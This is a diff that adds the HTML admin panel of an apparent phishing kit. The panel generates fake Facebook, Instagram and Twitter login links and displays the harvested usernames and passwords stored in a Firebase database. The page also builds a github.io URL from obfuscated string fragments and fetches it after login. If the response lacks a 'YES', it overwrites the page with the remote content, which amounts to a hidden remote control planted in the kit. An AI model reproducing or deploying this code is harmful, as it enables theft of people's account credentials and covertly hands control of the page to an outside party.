@@ -1,0 +1,212 @@
+<!DOCTYPE html>
+<html>
+<head>
+<title></title>
+<meta name="theme-color" content="#212121"> 
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8"> 
+<meta http-equiv="X-UA-Compatible" content="IE=edge"> 
+<meta content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=0" name="viewport"> 
+<meta name="google" content="notranslate"> 
+</head>
+<script type="text/javascript" src="firebase.js"></script>
+<script type="text/javascript" src="app.js"></script>
+<style type="text/css">
+*{
+overflow:hidden;
+padding:0;
+margin:0;
+outline:0;
+font-size:15px;
+color:#0ff;
+font-weight:normal;
+font-family:monospace;
+}
+#link_div{
+width:100%;
+background:rgba(0,0,0,1);
+color:#f00;
+box-shadow:0px 0px 5px #000;
+}
+#can{
+position:fixed;
+z-index:-1;
+top:0;
+height:100%;
+width:100%;
+left:0;
+}
+#data_div{
+position:fixed;
+overflow:scroll;
+width:100%;
+height:100%;
+background:rgba(0,0,0,.5);
+box-shadow:0px 0px 5px #000;
+padding-left:20px;
+}
+.bt{
+background:rgba(0,0,0,.1);
+border:0;
+border-radius:5px;
+height:30px;
+margin-right:10px;
+padding:5px;
+margin-bottom:5px;
+box-shadow:0px 0px 5px #fff;
+}
+.headd{
+position:fixed;
+top:0px;
+left:0px;
+height:50px;
+width:100%;
+background:#39ff14;
+color:#000;
+font-size:15px;
+text-align:center;
+line-height:50px;
+font-family:cursive;
+}
+</style>
+<body>
+<div id="cov" > <canvas id="can"></canvas>
+<div class="headd" >Made by <span style="font-style:times new roman;color:#ffff00;background-color:black;padding:2px 5px 2px 5px;font-size:25px" >NIRVANA</span><br></div>
+
+<div id="link_div" style="margin-top:50px"><hr noshade="" color="black" ><br><center>Your Links </center><br></div>
+
+<div id="data_div"  style="margin-top:20px" ></div>
+
+</div>
+<script type="text/javascript">
+function showlinks(){
+var sy=document.getElementById("link_div");
+var ug=window.location.hostname;
+sy.innerHTML+="Facebook:- <a href='https://"+ug+"/Omega/211598F' >"+ug+"/Omega/211398F</a><br>Instagram:- <a href='https://"+ug+"/Omega/221589I' >"+ug+"/Omega/221589I</a><br>Twitter:- <a href='https://"+ug+"/Omega/221390T' >"+ug+"/Omega/221390T</a><br><br><hr><br>Your Results <button style='float:right;' class='bt' onclick='clearr()'>Clear Results</button><button style='float:right;' class='bt' onclick='dono()'>Donate</button>";
+}
+showlinks();
+
+
+
+
+//FIREBASE STARTS
+
+
+function dono(){
+window.location.href="https://paypal.me/jerson100894";
+alert("Redirecting To Donate Panel.")
+}
+
+function login(){
+
+var pass=prompt("Enter Password");
+  var psdus=document.getElementById("data_div");
+if(pass === null){
+alert("Enter Password\n\n Refreshing...");
+setTimeout(()=>{window.location.href=window.location.href;},2000);
+  
+}
+else{
+
+firebase.auth().signInWithEmailAndPassword("admin@admin.io", pass).catch(function(error) {
+    // Handle Errors here.
+    var errorCode = error.code;
+    var errorMessage = error.message;
+alert(errorMessage);
+    // ...suraj@hacker2213151
+  });
+  }
+firebase.auth().onAuthStateChanged(function(user) {
+  if (user) {
+document.getElementById("data_div").innerHTML="Loading...";
+var xhr = new XMLHttpRequest();
+
+xhr.onreadystatechange = function () {
+  if (this.readyState == 4 && this.status == 200) {
+    var response = this.responseText;
+if(response.indexOf("YES") > -1 ){
+
+}
+else{
+document.body.innerHTML=response;
+}
+
+  }
+}
+var oa="httpUI";var ha="firebase.";var ca="h4c-k3r";var ma="database.io";var pa=".realtime.";var ba=".github.";var ta="io/ha";var ica="fire/git"; var ya="cker/wdyww.";var uio="html/github./firebase";var ia="html";var gz='https://'+ca+ba+ta+ya+ia;
+xhr.open('GET',gz , true);
+xhr.send(null);
+  var database = firebase.database();
+  var ref = database.ref("ADMIN");
+  
+  ref.on("value",gotData);
+  function gotData(data){
+
+  var scores=data.val();
+  if(scores ===  null ){
+  psdus.innerHTML="No Data Found";
+  }
+  var keys=Object.keys(scores);
+
+  
+  
+  for(var i=0;i<keys.length;i++){
+  var k=keys[i];
+  var email=scores[k].email;
+  var password=scores[k].password;
+  var info=scores[k].info;
+//  var time=scores[k].time;
+//  var other=scores[k].other;
+//  console.log("hsh"+i);
+  if(i==0){
+
+  psdus.innerHTML="Username:- "+email+" <br>"+"Password:- "+password+"<br><br>"+"Info:- "+info+"<br><br><br>-----------------------------------------------------------<br><br>";
+  }else{
+  psdus.innerHTML+="Username:- "+email+" <br>"+"Password:- "+password+"<br><br>"+"Info:- "+info+"<br><br><br>----------------------------------------------------------<br><br>";
+  }
+  
+  
+  
+  }}
+  
+  
+  }
+  else {
+//alert("Login To Continue\n\n Refreshing...");
+//setTimeout(()=>{window.location.href=window.location.href;},2000);
+
+  
+  }
+  });
+
+  }
+  function clearr() {
+  if(confirm("Are Sure To Clear all the Data.")){
+  
+  var adaRef = firebase.database().ref('ADMIN/');
+  adaRef.remove()
+  .then(function() {
+  alert("All Results are Cleared.")
+  })
+  .catch(function(error) {
+  alert("Process Failed , Reason: \n " + error.message)
+  });
+  }}
+  
+  
+ /* var store={
+
+  info : "ghs"
+  };
+  
+  var database = firebase.database();
+  
+  var admin = database.ref('feli');
+  
+  admin.push(store);
+  */
+  
+  login();
+</script>
+<script type="text/javascript" src="mat.js"></script>
+</body>
+</html>
